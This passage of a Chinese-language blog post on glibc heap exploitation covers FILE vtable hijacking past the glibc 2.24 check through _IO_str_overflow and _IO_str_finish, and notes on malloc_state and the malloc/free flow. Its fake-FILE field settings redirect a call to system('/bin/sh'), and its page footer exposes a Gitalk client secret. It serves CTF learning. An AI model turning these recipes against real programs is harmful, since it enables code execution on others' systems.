<p>将函数控制流控制在 setcontext+53 的位置，是因为这里正好可以修改 rsp 到我们的可控地址来进 行 rop，在切栈之后就可以按照如上过程执行 rop。 首先调用 mprotect 函数将 当前 heap 段设置为可执行，然后调用 cat flag 的 shellcode。</p>
<p><strong>glibc2.24：</strong></p>
<p>在_IO_OVERFLOW做了小小的改动，IO_validate_vtable增加了虚表范围的检查，也就是虚表地址必须位于<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间，显然之前在堆中伪造的虚表不满足要求。</p>
<p><img src="https://files.catbox.moe/pf2bz8.png" alt="image-20221117144759735"></p>
<p><strong>方法一：利用_IO_str_overflow</strong>  </p>
<p>虽然不能把vtable改到堆上了,但是我们依旧可以改 vtable为_IO_str_jump来绕过检测(_IO_str_jump这个虚表位于上面的范围之内)，因为其中使用的IO_str_overflow 函数会调用 FILE+0xe0处的地址。这时只要我们将虚表覆盖为_IO_str_jumps将偏移0xe0处设置为one_gadget即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// libio/strops.c</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">{</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://files.catbox.moe/y4z42z.png" alt="image-20221117154004353"></p>
<p>需要满足的条件是：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.f</span>p-&gt;_flags &amp; _IO_NO_WRITES为假</span><br><span class="line"><span class="number">2.</span>pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only为真</span><br><span class="line"><span class="number">3.f</span>p-&gt;_flags &amp; _IO_USER_BUF为假</span><br><span class="line"><span class="number">4.</span>_IO_size_t new_size = <span class="number">2</span> * old_blen + <span class="number">100</span> 指向<span class="string">"/bin/sh"</span></span><br><span class="line"><span class="number">5.</span>(*((_IO_strfile *) fp)-&gt;_s._allocate_buffer)指向system的地址</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2. flush_only = EOF = 0; _IO_blen (fp) = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base; 所以第2条等于pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base</span></span><br><span class="line"><span class="comment">4. 结合第4条：new_size = 2 * old_blen + 100 = 2 * (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base) + 100 = bin_sh_addr</span></span><br><span class="line"><span class="comment">5. _s._allocate_buffer在fp中的偏移是0xe0，因此要设置：</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">fp-&gt;_flags = <span class="number">0</span> </span><br><span class="line">fp-&gt;_IO_buf_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_end = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span></span><br><span class="line">fp-&gt;_IO_write_base = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_write_ptr = (bin_sh_addr - <span class="number">100</span>)/<span class="number">2</span> 或 fp-&gt;_IO_write_ptr = <span class="number">0xffffffff</span> 或根本不设置该值</span><br><span class="line">fp+<span class="number">0xe0</span> = system_addr</span><br><span class="line">fp-&gt;mode = <span class="number">0</span></span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x18</span></span><br></pre></td></tr></tbody></table></figure>

<p><strong>方法二：利用_IO_str_finish</strong></p>
<p><img src="https://files.catbox.moe/1jxlfs.png" alt="image-20221117160607396"></p>
<p>需要满足的条件是：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_buf_base为真，(fp-&gt;_flags &amp; _IO_USER_BUF)为假</span><br><span class="line">fp-&gt;_IO_buf_base为bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer为system函数地址</span><br><span class="line">    </span><br><span class="line">fp-&gt;_flags = <span class="number">0</span></span><br><span class="line">fp-&gt;_IO_buf_base = bin_sh_addr</span><br><span class="line">fp-&gt;_s._free_buffer = system_addr</span><br><span class="line">vtable = _IO_str_jumps - <span class="number">0x8</span></span><br></pre></td></tr></tbody></table></figure>

<p>利用之前的House of Orange，将vtable改为_IO_str_jumps - 0x8，因为_IO_str_finish在_IO_str_jumps的偏移与在中偏移不同。</p>
<p><img src="https://files.catbox.moe/wy1ir1.png" alt="image-20221117163009870"></p>
<p>由于 <code>_IO_str_jumps</code> 不是导出符号，因此无法直接利用 pwntools 进行定位，我们可以利用 <code>_IO_str_jumps</code>中的导出函数，例如 <code>_IO_str_underflow</code> 进行辅助定位，我们可以利用gdb去查找所有包含这个<code>_IO_str_underflow</code> 函数地址的内存地址，如下所示：</p>
<p><img src="https://files.catbox.moe/idkgzn.png" alt="image-20221117172435419"></p>
<p>再利用 <code>_IO_str_jumps</code> 的地址大于 <code>_IO_file_jumps</code> 地址的条件，就可以锁定最后一个地址为符合条件的 <code>_IO_str_jumps</code> 的地址，由于 <code>_IO_str_underflow</code> 在<code>_IO_str_jumps</code> 的偏移为0x20，我们可以计算出<code>_IO_str_jumps</code> 的地址。</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps</span>():</span></span><br><span class="line">	IO_file_jumps_offset = libc.sym[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">	IO_str_underflow_offset = libc.sym[<span class="string">'_IO_str_underflow'</span>]</span><br><span class="line">	<span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">		possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">		<span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:                                     <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br></pre></td></tr></tbody></table></figure>

<p>彩蛋：glibc2.29的虚表可写！</p>
<p><img src="https://files.catbox.moe/cu3dhr.png" alt="image-20221117170950250"></p>
<hr>
<p>最后记录一下malloc_state结构和malloc和free的流程：</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">malloc_state就是内存中用来管理堆的数据结构，源码中表现形式如下</span><br><span class="line"></span><br><span class="line"><span class="comment">/*保存堆状态的结构体malloc_state*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="comment">/*该变量用于控制程序串行访问同一个分配区，当一个线程获取了分配区之后，其它线程要想访问该分配区，就必须等待该线程分配完成后才能够使用。*/</span></span><br><span class="line">  __libc_lock_define (, mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="comment">/*flags 记录了分配区的一些标志*/</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span></span><br><span class="line">  <span class="comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span></span><br><span class="line">  <span class="keyword">int</span> have_fastchunks;<span class="comment">/*是否存在fastbin*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins （0x20~0x80）*/</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];<span class="comment">/*记录fastbin*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;<span class="comment">/*记录top chunk*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;<span class="comment">/*分割后剩余部分*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  <span class="comment">/* unsorted_bin small_bin(0x20-0x400) large_bin(&gt;0x400) */</span></span><br><span class="line">    mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];<span class="comment">/*标识某个bin是否空的map */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span><span class="comment">/*与下一个malloc_state形成双链表*/</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>

<p>ptmalloc2共有127个bin。其中62个small bin，64个large bin以及一个unsorted bin。malloc_state的bins数组存放了所有的bins信息（除tcache）</p>
<p>其中<code>bin[0]bin[1]</code>保存了unsorted bin链表的头指针.<code>bin[2]</code>和<code>bin[3]</code>合起来指示了一个bin双链表就是堆的第一个small bin，其中<code>bin[2]</code>是头指针，<code>bin[3]</code>是尾指针。</p>
<p><strong>malloc：</strong></p>
<p>1.如果size &lt; max fast, 在fast bins中寻找fast chunk， 如找到则结束<br>2.如果(if) size in_ smallbin_ range, 在small bins中寻找small chunk,如找到则结束<br>3.如果(else) size not in_smallbin_ range， 合并所有fastbin的chunk<br>4.循环<br>—a.检查unsorted bin中的last_remainder(初始为0)<br>        如果满足一 定条件，则分裂之，将剩余的chunk标记为新的last remainder<br>—b.在unsorted bin中搜索，同时进行整理<br>        如遇到精确大小， 则返回，否则就把当前chunk整理到small/large bin中去.<br>—c.在small bin和large bin中搜索最合适的chunk (不一定是精确大小)<br>5.使用top chunk</p>
<blockquote>
<p>通常这里会使用到unsorted bin分割的手法，即已有unsorted bin，再次申请一个小堆块，如果没有满足条件的堆块就进入4.循环，一般初始last_remainder为0，所以跳过步骤a，将此unsorted bin整理进入small bin(或large)，然后进行步骤c，将small bin分割并分配出来( 此时该堆块中残留smallbin的地址，可用于泄露libc )，剩下的则进入unsorted bin，标为last_remainder。再次分割unsorted bin时，此时last_remainder存在，则进行步骤a。</p>
</blockquote>
<p><strong>free:</strong></p>
<p>1.如果size &lt; max fast,放入fast bin,结束<br>2.如果前一个chunk是free的<br>—a. unlink前面的chunk<br>—b.合并两个chunk(向后合并), 并放入unsorted bin<br>3.如果后一个chunk是top chunk,则将当前chunk并入top chunk(向前合并)<br>4.如果后一个chunk时free的<br>—a. unlink后面的chunk<br>—b. 合并两个chunk(向前合并),并放入unsorted bin<br>5.前后chunk都不是free的,放入unsorted bin</p>
<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>堆的利用灵活多变，且情况比栈的利用复杂的多，我所记录的只是一些最基本且常见的方法，便于对堆溢出漏洞利用有一个比较客观的认识，至于更多技巧，则需要自己不断实践和学习积累来获得。</p>

        </div>


            <section class="post-copyright">
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://ld1ng.top/2020/08/06/Heap/">http://ld1ng.top/2020/08/06/Heap/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
		
		<section class="post-tags">
		<div>
		<span>Tags: </span>
		<span class="tag">
		
		
		<!-- <a href="/tags/KNOWLEDGE/"># KNOWLEDGE</a> -->
		<a href="/tags/KNOWLEDGE/">🏷️KNOWLEDGE</a>
		
		
		</span>
		</div>
		<!-- 支持一下的按钮与图片 -->
		<div class="reward" id="reward">
		<div class="sponser">
		<div class="sponser_btn">☕Buy Me a Coffee</div>
		<div class="sponser_img">
		<div class="sponser_container">
	
		<div class="alipay">
		<span class="sponser_alipay_title"></span>
		<div>
		<img class="sponser_alipay" src="/image/Wechat.jpg">
		</div>
		</div>
	
		</div>
		</div>
		</div>
		</div>
		<div>
		<a href="javascript:window.history.back();">Back</a>
		<span>· </span>
		<a href="/">Home</a>
		</div>
		</section>
		
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/09/01/Aug_Match/">Aug_Match 2020</a>
            
            
            <a class="next" rel="next" href="/2020/08/05/WMCTF/">WMCTF2020</a>
            
        </section>
		

    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
      var gitalk = new Gitalk({
        clientID: '458a98372426d92cae5a',
        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
        repo: 'ld1ng.github.io',
        owner: 'Ld1ng',
        admin: 'Ld1ng',
        id: md5(location.pathname),
        labels: 'Gitalk'.split(',').filter(l => l),
        perPage: 10,
        pagerDirection: 'last',
        createIssueManually: true,
        distractionFreeMode: false
      })
      gitalk.render('gitalk-container')
</script>


    </article>
</div>
            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Ld1ng🍕 © 2020 - 2023 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a><a></a>
		
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


<span class="site-pv">
    | Visitors: 
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


</span>
    </div>
</footer>

    </div>
</body>

<!-- 搜索功能 -->
<!-- Chic/layout.ejs -->
<div id="u-search">
    <div class="modal">
        <div class="modal-header">
            <div class="container">
                <form id="u-search-modal-form" class="u-search-modal-form">
                    <button type="submit" class="form-submit-btn">
                        <img src="/image/search.png" class="search-btn-img" />
                    </button>
                    <input placeholder="搜索内容..." class="form-input" id="modal-form-input">
                </form>
                <a class="modal-close">x</a>
            </div>
            <div class="search-loading">
                <div class="search-loading-bar"></div>
            </div>
        </div>
        <div class="modal-body">
        </div>
    </div>
    <div class="modal-overlay"></div>
</div>

</html>